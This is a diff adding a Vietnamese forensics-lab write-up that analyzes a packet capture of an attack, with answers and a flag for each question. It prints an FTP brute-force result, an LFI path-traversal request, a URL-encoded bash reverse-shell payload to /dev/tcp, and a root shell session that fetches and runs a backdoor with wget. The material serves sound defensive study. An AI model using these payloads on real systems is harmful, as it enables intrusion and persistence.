@@ -509,6 +509,350 @@ Và quan trọng nhất là ta đã thấy lời nhắn mà attackers để lạ
 - Các lần truy cập thất bại và thành công lặp đi lặp lại vào các file không công khai.
 - Requests POST bất thường với các commands quản trị hoặc backend.
 
+### 5. Lab 05:
+- The traffic capture file can be downloaded from: https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab 05/files/challenge.pcapng
+- The organization that previously hired you to investigate the web attack has reached out to you again. This time, they have managed to capture the network traffic during the attack. They have provided you with the captured traffic file to help piece together the attacker's intentions and the extent of the damage. Your job is to analyze the captured traffic and answer the following questions:
+#### 1. What are the different protocols present in the captured traffic file?
+Vào `Statistics` $\rightarrow$ `Protocol Hierarchy` để xem protocols nào đang được dùng trong lưu lượng và sự liên quan của các packets cho mỗi protocol:
+
+![image](https://hackmd.io/_uploads/rkp7YV-BWx.png)
+**$\rightarrow$ Đáp án: `TCP`, `HTTP`, `FTP Data`**
+
+#### 2. It appears that the attacker is attempting to brute force the user's FTP password. Can you find any evidence of a correct password, and if so, what is it?
+- Từ ảnh output ở câu trên, có thể thấy rằng số gói tin ở giao thức FTP nhiều bất thường và hơn các giao thức còn lại. Lọc các lưu lượng liên quan đến FTP:
+
+![image](https://hackmd.io/_uploads/r1hq9N-SWg.png)
+![image](https://hackmd.io/_uploads/rktIa4ZBWe.png)
+Có thể thấy rằng một user vô danh có IP `192.168.0.110` cố gắng đi đến `192.168.0.106` bằng cách brute-force mật khẩu.
+- Sau rất nhiều lần thử, attacker đã thành công với password `batman`:
+
+![image](https://hackmd.io/_uploads/HJTpTNZBWe.png)
+**$\rightarrow$ Đáp án: `batman`**
+
+#### 3. What additional information was the attacker able to extract from the user's FTP account?
+- Lướt tiếp thì ta phát hiện thêm hai file là `credentials.txt` và `.bash_history`:
+
+![image](https://hackmd.io/_uploads/BkMZZB-rbg.png)
+
+- Bấm vào một lưu lượng, chọn `File` $\rightarrow$ `Export Objects` $\rightarrow$ `FTP-DATA...` $\rightarrow$ `Save All` để extract hai file:
+
+![image](https://hackmd.io/_uploads/rJOkxHbrWe.png)
+- Nội dung `credentials.txt`:
+```
+Leaving my database username and password here in case I forget.
+
+username: myuser
+password: P@ssw0rd123456!
+```
+**$\rightarrow$ Đáp án: `credentials.txt`, `.bash_history`**
+
+#### 4. What actions did the attacker take with the information obtained from the user's FTP account?
+Từ output câu trên, ta thấy:
+- `SIZE`: Check size của file.
+- `EPSV`: Lệnh FTP yêu cầu server mở cổng passive mode để truyền data.
+- `RETR`: Download file từ server về client.
+- `MDMT`: Hỏi thời gian chỉnh sửa cuối của file.
+
+**$\rightarrow$ Đáp án: Attacker tải file (`RETR`) và check file rất kỹ.** 
+
+#### 5. What's the root account password?
+Nội dung `credentials.txt`:
+```
+Leaving my database username and password here in case I forget.
+
+username: myuser
+password: P@ssw0rd123456!
+```
+**$\rightarrow$ Đáp án: `P@ssw0rd123456!`** 
+
+#### 6. Can you identify the packet numbers in which the attacker exploited the Remote Code Execution vulnerability to gain access to the system? What was the exact payload used by the attacker?
+- FTP chỉ là truy cập ban đầu, RCE thường xảy ra qua HTTP, command injection, reverse shell. Ta lọc `http.request` và `tcp contains "bash"`:
+
+![image](https://hackmd.io/_uploads/BkF2LSZrbl.png)
+![image](https://hackmd.io/_uploads/H1FxwSbrbl.png)
+- Ở `http.request`, có thể thấy các request `GET /images.php?file=../../../../../../../../etc/passwd` là dấu hiệu của LFI trước khi thực hiện RCE. Bên cạnh đó còn có `/command.php HTTP/1.1`, có thể đoán rằng đây là RCE qua `command.php`.
+- TCP Stream hiển thị toàn bộ cuộc hội thoại cho một kết nối TCP cụ thể, click chuột phải vào các packet `/command.php` và chọn `Follow` $\rightarrow$ `TCP Stream`, trong packet `2674` và `2678` có payload:
+```
+cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.106%2F4444+0%3E%261
+```
+Nghĩa là `cmd=bash -i >& /dev/tcp/192.168.0.106/4444 0>&1` (URL decode), mà dấu hiệu của RCE trong Reverse Shell là `bash -i >& /dev/tcp/IP/PORT 0>&1`.
+
+**$\rightarrow$ Đáp án: `2674`, `2678`**
+```
+cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.106%2F4444+0%3E%261
+```
+
+#### 7. After gaining access to the system, what does the attacker seem to be doing?
+- Ngay sau packet `2678`, ta thấy:
+
+![image](https://hackmd.io/_uploads/SyzuaBbrZg.png)
+Nghĩa là Reverse Shell đã kết nối thành công:
+    - `55662 → 4444 [PSH, ACK]`
+    - `4444 → 55662 [PSH, ACK]`
+- Xem TCP Stream của port `4444`:
+``` bash
+bash: cannot set terminal process group (1125): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@w:/var/www/html$ 
+whoami
+
+whoami
+www-data
+www-data@w:/var/www/html$ 
+ls -la
+
+ls -la
+total 48
+drwxr-xr-x 3 www-data www-data 4096 ..........   23 00:09 .
+drwxr-xr-x 3 root     root     4096 ..........   11 15:02 ..
+-rw-r--r-- 1 www-data www-data 1695 ..........   14 02:34 command.php
+-rw-r--r-- 1 www-data www-data  620 ..........   11 19:58 database.sql
+-rw-r--r-- 1 root     root       61 ..........   23 03:05 flag.txt
+drwxr-xr-x 2 www-data www-data 4096 ..........   13 00:49 images
+-rwxr-x--- 1 www-data www-data 2372 ..........   13 00:52 images.php
+-rw-r--r-- 1 www-data www-data  612 ..........   11 15:02 index.nginx-debian.html
+-rwxr-x--- 1 www-data www-data 1566 ..........   11 20:49 index.php
+-rw-r--r-- 1 www-data www-data  636 ..........   11 19:49 sql.sql
+-rw-r--r-- 1 www-data www-data 2900 ..........   14 02:34 users.php
+-rw-r--r-- 1 www-data www-data  219 ..........   14 02:34 view.php
+www-data@w:/var/www/html$ 
+cat flag.txt
+
+cat flag.txt
+No flag for you. Did you really think it would be this easy?
+www-data@w:/var/www/html$ 
+su root
+
+su root
+Password: 
+1amgr000000t!@#$ 
+id
+
+su: Authentication failure
+www-data@w:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@w:/var/www/html$ 
+su root
+
+su root
+Password: 
+1amgr000000t!@#$
+id
+
+uid=0(root) gid=0(root) groups=0(root)
+
+python3 -c "import pty; pty.spawn('/bin/bash');"
+
+root@w:/var/www/html# 
+cd ~
+
+cd ~
+root@w:~# 
+ls -la
+
+ls -la
+total 56
+drwx------  7 root root 4096 ..........  23 04:27 .
+drwxr-xr-x 20 root root 4096 ..........   8 20:40 ..
+-rw-------  1 root root 2663 ..........  23 04:27 .bash_history
+-rw-r--r--  1 root root 3106 ............ 15  2021 .bashrc
+drwx------  5 root root 4096 ..........  16 01:42 .cache
+drwxr-xr-x  2 root root 4096 ............ 12 14:22 .cassandra
+drwx------  7 root root 4096 ..........  23 04:04 .config
+-rw-r--r--  1 root root  133 ..........  23 02:47 gr00t.txt
+-rw-------  1 root root   20 ..........  11 17:41 .lesshst
+drwxr-xr-x  3 root root 4096 ..........   5 09:30 .local
+-rw-------  1 root root  353 ..........  11 19:58 .mysql_history
+-rw-r--r--  1 root root  161 ............  9  2019 .profile
+drwx------  5 root root 4096 ..........   8 21:09 snap
+-rw-r--r--  1 root root    0 ............ 12 14:17 .sudo_as_admin_successful
+-rw-r--r--  1 root root  180 ..........  23 04:23 .wget-hsts
+root@w:~# 
+cat gr00t.txt
+
+cat gr00t.txt
+Congrats on getting here. But that's not it, the real test starts now! ;)
+
+Btw, here's your flag for this stage: flag{1_4m_gr00000t!}root@w:~# 
+cd /tmp
+
+cd /tmp
+root@w:/tmp# 
+wget https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py
+
+
+<igital-forensics-lab/main/Lab%205/files/backdoor.py
+--2023-02-23 04:28:24--  https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1181 (1.2K) [text/plain]
+backdoor.py: No such file or directory
+
+Cannot write to ...backdoor.py... (Success).
+root@w:/tmp# 
+cd ~
+
+cd ~
+root@w:~# 
+wget https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py
+
+
+<igital-forensics-lab/main/Lab%205/files/backdoor.py
+--2023-02-23 04:28:29--  https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1181 (1.2K) [text/plain]
+Saving to: ...backdoor.py...
+
+
+backdoor.py           0%[                    ]       0  --.-KB/s               
+backdoor.py         100%[===================>]   1.15K  --.-KB/s    in 0s      
+
+2023-02-23 04:28:29 (18.3 MB/s) - ...backdoor.py... saved [1181/1181]
+
+root@w:~# 
+python3 backdoor.py &
+
+python3 backdoor.py &
+[1] 1190714
+root@w:~# Traceback (most recent call last):
+  File "/root/backdoor.py", line 54, in <module>
+    main()
+  File "/root/backdoor.py", line 23, in main
+    s.bind((HOST, PORT))
+OSError: [Errno 98] Address already in use
+
+
+
+
+[1]+  Exit 1                  python3 backdoor.py
+root@w:~# 
+netstat -tunlp | grep python
+
+netstat -tunlp | grep python
+tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      1190466/python3     
+root@w:~# 
+kill 1190466
+
+kill 1190466
+root@w:~# 
+python3 backdoor.py &
+
+python3 backdoor.py &
+[1] 1190745
+root@w:~# 
+rm backdoor.py
+
+rm backdoor.py
+root@w:~#
+```
+- Có thể thấy rằng sau khi xác nhận user hiện tại (`whoami`, `www-data`), attacker đã kiểm tra và tìm kiếm các file nhạy cảm, sau đó là leo quyền thành công với:
+```
+su root
+Password: 1amgr000000t!@#$
+```
+
+#### 8. The attacker read a file from root's home directory. What was in that file?
+Lướt tiếp TCP Stream, có thể thấy rằng attacker đã đọc `gr00t.txt` và tìm được flag:
+``` bash
+root@w:~# 
+cat gr00t.txt
+
+cat gr00t.txt
+Congrats on getting here. But that's not it, the real test starts now! ;)
+
+Btw, here's your flag for this stage: flag{1_4m_gr00000t!}
+```
+**$\rightarrow$ Đáp án: `flag{1_4m_gr00000t!}`** 
+
+#### 9. The attacker downloaded a file inside root's home directory. What's the purpose of that file?
+Lướt tiếp đoạn cuối của TCP Stream:
+``` bash
+root@w:~# 
+wget https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py
+
+
+<igital-forensics-lab/main/Lab%205/files/backdoor.py
+--2023-02-23 04:28:29--  https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%205/files/backdoor.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1181 (1.2K) [text/plain]
+Saving to: ...backdoor.py...
+
+
+backdoor.py           0%[                    ]       0  --.-KB/s               
+backdoor.py         100%[===================>]   1.15K  --.-KB/s    in 0s      
+
+2023-02-23 04:28:29 (18.3 MB/s) - ...backdoor.py... saved [1181/1181]
+
+root@w:~# 
+python3 backdoor.py &
+
+python3 backdoor.py &
+[1] 1190714
+root@w:~# Traceback (most recent call last):
+  File "/root/backdoor.py", line 54, in <module>
+    main()
+  File "/root/backdoor.py", line 23, in main
+    s.bind((HOST, PORT))
+OSError: [Errno 98] Address already in use
+
+
+
+
+[1]+  Exit 1                  python3 backdoor.py
+root@w:~# 
+netstat -tunlp | grep python
+
+netstat -tunlp | grep python
+tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      1190466/python3     
+root@w:~# 
+kill 1190466
+
+kill 1190466
+root@w:~# 
+python3 backdoor.py &
+
+python3 backdoor.py &
+[1] 1190745
+root@w:~# 
+rm backdoor.py
+
+rm backdoor.py
+root@w:~# 
+```
+Có thể thấy rằng attacker đã:
+- Tải file `backdoor.py` từ GitHub.
+- Chạy backdoor ở chế độ nền bằng `python3 backdoor.py &`: Mở cổng TCP `5555` v lắng nghe kết nối và duy trì quyền truy cập lâu dài để có thể thực thi từ xa.
+- Lỗi trong quá trình chạy: `OSError: [Errno 98] Address already in use`:Backdoor cố `bind()` vào một port cố định `5555` nhưng port đó đã có tiến trình khác chiếm nên không thể mở socket $\rightarrow$ Lỗi điển hình khi chạy malware/backdoor nhiều lần.
+- Kiểm tra tiến trình chiếm port:
+
+![image](https://hackmd.io/_uploads/ryP_zrzrWg.png)
+- Xoá tiến trình `1190466` rồi xoá luôn `backdoor.py` để xoá dấu vết:
+
+![image](https://hackmd.io/_uploads/ByZLQHGBbx.png)
+    - Giải phóng port `5555`.
+    - Dừng tiến trình đang chạy.
+    - Cho phép chạy lại instance mới.
+
+**$\rightarrow$ Đáp án: `Persistence backdoor`** 
+
+#### 10. What information was transmitted through the attacker's covertly established channel of communication?
+Qua port Reverse Shell `4444`, backdoor `5555` và HTTP kết nối GitHub, có thể đoán được dữ liệu bị truyền gồm:
+- Output command
+- `credential.txt`:
+```
+Leaving my database username and password here in case I forget.
+
+username: myuser
+password: P@ssw0rd123456!
+```
+- Flag: `flag{1_4m_gr00000t!}`
+- Thông tin hệ thống
+
 ## B. TryHackMe:
 ### I. Task 10 - Windows Forensics 1:
 *Link tham khảo: [TryHackMe](https://tryhackme.com/room/windowsforensics1)*
